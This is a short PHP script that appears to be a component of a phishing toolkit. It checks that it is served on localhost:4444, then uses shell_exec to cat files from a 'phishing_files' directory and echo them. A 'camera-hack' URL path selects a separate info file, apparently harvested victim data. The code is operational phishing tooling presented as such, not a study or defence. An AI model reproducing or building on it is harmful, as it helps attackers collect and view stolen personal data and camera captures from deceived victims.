<?php
$url = $_SERVER['REQUEST_URI'];
$localhost = $_SERVER['HTTP_HOST'];
if ($localhost == "localhost:4444" ){
	if (strpos($url,"info-remove")){
	}
	else{
		if (strpos($url,"camera-hack")){
			$info = shell_exec('cat ../../phishing_files/info-2.php');
		}else{
	$info = shell_exec('cat ../../phishing_files/info.php'); }
	echo "$info";
	}
}
?>
